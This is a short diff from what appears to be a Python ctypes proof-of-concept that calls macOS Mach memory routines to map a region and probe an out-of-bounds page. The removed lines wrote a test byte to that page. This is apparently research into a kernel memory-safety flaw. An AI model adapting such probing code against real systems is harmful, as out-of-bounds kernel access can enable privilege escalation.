@@ -49,10 +49,6 @@ kr = V(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
 print(f"map_child kr={kr} va={hex(m.value)}")
 if kr != 0: raise SystemExit(1)
 
-q = (C.c_uint8 * 0x4000).from_address(m.value)
-q[0x3000] = 0xAB
-print("wrote 0xAB to OOB page")
-
 shadow_ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
 kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(shadow_ne), 0)
 print(f"shadow_ne kr={kr} ne={shadow_ne.value}")
